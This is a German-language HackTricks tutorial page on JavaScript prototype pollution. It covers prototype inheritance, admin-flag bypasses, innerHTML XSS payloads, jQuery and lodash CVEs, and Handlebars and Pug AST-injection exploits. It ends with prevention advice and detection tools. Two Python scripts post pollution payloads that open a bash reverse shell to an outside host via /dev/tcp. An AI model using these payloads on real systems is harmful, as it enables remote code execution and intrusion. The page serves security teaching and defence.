# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Objekte in JavaScript <a href="#id-053a" id="id-053a"></a>

Objekte in JavaScript sind im Wesentlichen Sammlungen von Schl√ºssel-Wert-Paaren, die als Eigenschaften bekannt sind. Ein Objekt kann mit `Object.create` und `null` als Argument erstellt werden, um ein leeres Objekt zu erzeugen. Diese Methode erm√∂glicht die Erstellung eines Objekts ohne vererbte Eigenschaften.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
Ein leeres Objekt entspricht einem leeren W√∂rterbuch, dargestellt als `{}`.

### Funktionen und Klassen in JavaScript

In JavaScript sind Klassen und Funktionen eng miteinander verbunden, wobei Funktionen oft als Konstruktoren f√ºr Klassen dienen. Trotz des Mangels an nativer Klassenunterst√ºtzung in JavaScript k√∂nnen Konstruktoren das Verhalten von Klassen nachahmen.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prototypen in JavaScript

JavaScript erm√∂glicht die Modifikation, Hinzuf√ºgung oder L√∂schung von Prototyp-Attributen zur Laufzeit. Diese Flexibilit√§t erm√∂glicht die dynamische Erweiterung von Klassenfunktionalit√§ten.

Funktionen wie `toString` und `valueOf` k√∂nnen ver√§ndert werden, um ihr Verhalten zu √§ndern und damit die anpassungsf√§hige Natur des JavaScript-Prototypsystems zu demonstrieren.

## Vererbung

Im prototypenbasierten Programmieren werden Eigenschaften/Methoden von Klassen von Objekten geerbt. Diese Klassen werden erstellt, indem Eigenschaften/Methoden entweder zu einer Instanz einer anderen Klasse oder zu einem leeren Objekt hinzugef√ºgt werden.

Es sollte beachtet werden, dass wenn einer Instanz, die als Prototyp f√ºr andere Objekte dient (wie `myPersonObj`), eine Eigenschaft hinzugef√ºgt wird, die ererbenden Objekte Zugriff auf diese neue Eigenschaft erhalten. Diese Eigenschaft wird jedoch nicht automatisch angezeigt, es sei denn, sie wird explizit aufgerufen.

## \_\_proto\_\_ Pollution <a href="#id-0d0a" id="id-0d0a"></a>

## Erkundung der Prototypenverschmutzung in JavaScript

JavaScript-Objekte werden durch Schl√ºssel-Wert-Paare definiert und erben vom JavaScript-Objekt-Prototyp. Dies bedeutet, dass die √Ñnderung des Objekt-Prototyps alle Objekte in der Umgebung beeinflussen kann.

Lassen Sie uns ein anderes Beispiel verwenden, um dies zu veranschaulichen:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
Zugriff auf das Objekt-Prototyp ist m√∂glich durch:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Durch das Hinzuf√ºgen von Eigenschaften zum Object-Prototyp erbt jedes JavaScript-Objekt diese neuen Eigenschaften:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## Prototyp-Verschmutzung

F√ºr ein Szenario, in dem die Verwendung von `__proto__` eingeschr√§nkt ist, ist die Modifizierung des Prototyps einer Funktion eine Alternative:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
Dies betrifft nur Objekte, die aus dem `Vehicle`-Konstruktor erstellt wurden, und verleiht ihnen die Eigenschaften `beep`, `hasWheels`, `honk` und `isElectric`.

Zwei Methoden, um JavaScript-Objekte global durch Prototypen-Verschmutzung zu beeinflussen, sind:

1. Direktes Verschmutzen des `Object.prototype`:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. Verschmutzen des Prototyps eines Konstruktors f√ºr eine h√§ufig verwendete Struktur:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
Nach diesen Operationen kann jedes JavaScript-Objekt `goodbye` und `greet` Methoden ausf√ºhren.

## Verunreinigung anderer Objekte

### Von einer Klasse zu Object.prototype

In einem Szenario, in dem Sie ein bestimmtes Objekt verunreinigen k√∂nnen und zu `Object.prototype` gelangen m√ºssen, k√∂nnen Sie danach mit einem Code wie dem folgenden suchen:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Array-Elementverschmutzung

Beachten Sie, dass Sie, wie Sie Attribute von Objekten in JS verschmutzen k√∂nnen, wenn Sie Zugriff haben, um ein Array zu verschmutzen, auch **Werte des Arrays** verschmutzen k√∂nnen, die **√ºber Indizes zug√§nglich sind** (beachten Sie, dass Sie Werte nicht √ºberschreiben k√∂nnen, daher m√ºssen Sie Indizes verschmutzen, die auf irgendeine Weise verwendet, aber nicht geschrieben werden).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html-Elemente-Verschmutzung

Beim Generieren eines HTML-Elements √ºber JS ist es m√∂glich, das **`innerHTML`**-Attribut zu **√ºberschreiben**, um es dazu zu bringen, **beliebigen HTML-Code** zu schreiben. [Idee und Beispiel aus diesem Bericht](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Beispiele

### Grundlegendes Beispiel

Eine Prototyp-Verunreinigung tritt aufgrund eines Fehlers in der Anwendung auf, der das √úberschreiben von Eigenschaften auf `Object.prototype` erm√∂glicht. Dies bedeutet, dass da die meisten Objekte ihre Eigenschaften von `Object.prototype` ableiten.

Das einfachste Beispiel besteht darin, einen Wert zu einem **undefinierten Attribut eines Objekts** hinzuzuf√ºgen, das √ºberpr√ºft werden soll, wie:
```javascript
if (user.admin) {
```
Wenn das Attribut **`admin` undefiniert ist**, ist es m√∂glich, eine PP auszunutzen und es auf True zu setzen, beispielsweise mit:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
Der Mechanismus dahinter beinhaltet die Manipulation von Eigenschaften, so dass ein Angreifer bei Kontrolle √ºber bestimmte Eingaben das Prototyp aller Objekte in der Anwendung √§ndern kann. Diese Manipulation beinhaltet typischerweise das Setzen der `__proto__` Eigenschaft, die in JavaScript gleichbedeutend mit der direkten Modifikation des Prototyps eines Objekts ist.

Die Bedingungen, unter denen dieser Angriff erfolgreich ausgef√ºhrt werden kann, wie in einer spezifischen [Studie](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf) dargelegt, umfassen:

* Durchf√ºhrung einer rekursiven Zusammenf√ºhrung.
* Definition von Eigenschaften basierend auf einem Pfad.
* Klonen von Objekten.

### Funktion √ºberschreiben
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution zu RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

Andere Payloads:

* [https://github.com/KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution)

## Client-seitige Prototype Pollution zu XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358: Prototype Pollution Angriff durch jQuery $ .extend

[F√ºr weitere Details siehe diesen Artikel](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) In jQuery kann die `$ .extend` Funktion zu Prototype Pollution f√ºhren, wenn das Deep-Copy-Feature falsch verwendet wird. Diese Funktion wird h√§ufig zum Klonen von Objekten oder zum Zusammenf√ºhren von Eigenschaften aus einem Standardobjekt verwendet. Wenn sie jedoch falsch konfiguriert ist, k√∂nnen Eigenschaften, die f√ºr ein neues Objekt vorgesehen sind, stattdessen dem Prototyp zugewiesen werden. Zum Beispiel:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Diese Schwachstelle, identifiziert als CVE-2019‚Äì11358, veranschaulicht, wie eine Deep Copy versehentlich das Prototype √§ndern kann, was zu potenziellen Sicherheitsrisiken f√ºhrt, wie z. B. unbefugtem Admin-Zugriff, wenn Eigenschaften wie `isAdmin` ohne ordnungsgem√§√üe Existenz√ºberpr√ºfung √ºberpr√ºft werden.

### CVE-2018‚Äì3721, CVE-2019‚Äì10744: Prototype-Pollution-Angriff √ºber lodash

[Weitere Details finden Sie in diesem Artikel](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) stie√ü auf √§hnliche Prototype-Pollution-Schwachstellen (CVE-2018‚Äì3721, CVE-2019‚Äì10744). Diese Probleme wurden in Version 4.17.11 behoben.

### Ein weiteres Tutorial mit CVEs

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Tools zur Erkennung von Prototype Pollution

* [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner): Eine Burp Suite-Erweiterung, die entwickelt wurde, um serverseitige Prototype-Pollution-Schwachstellen in Webanwendungen zu erkennen und zu analysieren. Dieses Tool automatisiert den Prozess des Scannens von Anfragen, um potenzielle Prototype-Pollution-Probleme zu identifizieren. Es nutzt bekannte Gadgets - Methoden zur Ausnutzung von Prototype-Pollution, um sch√§dliche Aktionen auszuf√ºhren - und konzentriert sich insbesondere auf Node.js-Bibliotheken.
* [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution): Diese Erweiterung identifiziert serverseitige Prototype-Pollution-Schwachstellen. Sie verwendet Techniken, die in der [Serverseitige Prototype Pollution](https://portswigger.net/research/server-side-prototype-pollution) beschrieben sind.

### AST Prototype Pollution in NodeJS

NodeJS nutzt Abstract Syntax Trees (AST) in JavaScript umfangreich f√ºr Funktionen wie Template-Engines und TypeScript. Dieser Abschnitt untersucht die mit der Prototype-Pollution in Template-Engines, insbesondere Handlebars und Pug, verbundenen Schwachstellen.

#### Analyse der Handlebars-Schwachstelle

Die Handlebars-Template-Engine ist anf√§llig f√ºr einen Prototype-Pollution-Angriff. Diese Schwachstelle ergibt sich aus spezifischen Funktionen innerhalb der Datei `javascript-compiler.js`. Die Funktion `appendContent` beispielsweise konkateniert `pendingContent`, wenn es vorhanden ist, w√§hrend die Funktion `pushSource` nach dem Hinzuf√ºgen der Quelle `pendingContent` auf `undefined` zur√ºcksetzt.

**Ausbeutungsprozess**

Die Ausbeutung nutzt den von Handlebars erstellten AST (Abstract Syntax Tree) und folgt diesen Schritten:

1. **Manipulation des Parsers**: Zun√§chst erzwingt der Parser √ºber den `NumberLiteral`-Knoten, dass Werte numerisch sind. Die Prototype-Pollution kann dies umgehen und das Einf√ºgen von nicht-numerischen Zeichenfolgen erm√∂glichen.
2. **Behandlung durch den Compiler**: Der Compiler kann ein AST-Objekt oder eine Zeichenfolgevorlage verarbeiten. Wenn `input.type` gleich `Program` ist, wird die Eingabe als voranalysiert behandelt, was ausgenutzt werden kann.
3. **Einschleusen von Code**: Durch Manipulation von `Object.prototype` kann beliebiger Code in die Vorlagenfunktion eingeschleust werden, was zu einer Remote-Code-Ausf√ºhrung f√ºhren kann.

Ein Beispiel, das die Ausnutzung der Handlebars-Schwachstelle demonstriert:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Dieser Code zeigt, wie ein Angreifer beliebigen Code in eine Handlebars-Vorlage einschleusen k√∂nnte.

**Externe Referenz**: Ein Problem im Zusammenhang mit der Prototyp-Verunreinigung wurde in der 'flat'-Bibliothek gefunden, wie hier detailliert beschrieben: [Problem auf GitHub](https://github.com/hughsk/flat/issues/105).

**Externe Referenz**: [Problem im Zusammenhang mit der Prototyp-Verunreinigung in der 'flat'-Bibliothek](https://github.com/hughsk/flat/issues/105)

Beispiel f√ºr einen Prototyp-Verunreinigungsangriff in Python:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pug-Schwachstelle

Pug, eine weitere Template-Engine, ist einem √§hnlichen Risiko der Prototyp-Verunreinigung ausgesetzt. Detaillierte Informationen finden Sie in der Diskussion √ºber [AST-Injektion in Pug](https://blog.p6.is/AST-Injection/#Pug).

Beispiel f√ºr Prototyp-Verunreinigung in Pug:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Vorbeugende Ma√ünahmen

Um das Risiko einer Prototyp-Verschmutzung zu reduzieren, k√∂nnen die unten aufgef√ºhrten Strategien angewendet werden:

1. **Objekt-Unver√§nderlichkeit**: Das `Object.prototype` kann durch Anwendung von `Object.freeze` unver√§nderlich gemacht werden.
2. **Eingabevalidierung**: JSON-Eingaben sollten rigoros gegen das Anwendungsschema validiert werden.
3. **Sichere Merge-Funktionen**: Der unsichere Einsatz von rekursiven Merge-Funktionen sollte vermieden werden.
4. **Prototyplose Objekte**: Objekte ohne Prototyp-Eigenschaften k√∂nnen mit `Object.create(null)` erstellt werden.
5. **Verwendung von Map**: Anstelle von `Object` sollte `Map` zur Speicherung von Schl√ºssel-Wert-Paaren verwendet werden.
6. **Bibliotheksaktualisierungen**: Sicherheitspatches k√∂nnen durch regelm√§√üige Aktualisierungen von Bibliotheken eingebunden werden.
7. **Linter und statische Analysetools**: Verwenden Sie Tools wie ESLint mit geeigneten Plugins, um Prototyp-Verschmutzungsanf√§lligkeiten zu erkennen und zu verhindern.
8. **Code-Reviews**: Implementieren Sie gr√ºndliche Code-Reviews, um potenzielle Risiken im Zusammenhang mit Prototyp-Verschmutzung zu identifizieren und zu beheben.
9. **Sicherheitstraining**: Schulen Sie Entwickler √ºber die Risiken der Prototyp-Verschmutzung und bew√§hrte Verfahren f√ºr das Schreiben von sicherem Code.
10. **Verwendung von Bibliotheken mit Vorsicht**: Seien Sie vorsichtig bei der Verwendung von Drittanbieter-Bibliotheken. Bewerten Sie ihre Sicherheitslage und √ºberpr√ºfen Sie ihren Code, insbesondere bei der Manipulation von Objekten.
11. **Laufzeitschutz**: Verwenden Sie Laufzeitschutzmechanismen wie die Verwendung von auf Sicherheit ausgerichteten npm-Paketen, die Prototyp-Verschmutzungsangriffe erkennen und verhindern k√∂nnen.

## Referenzen

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
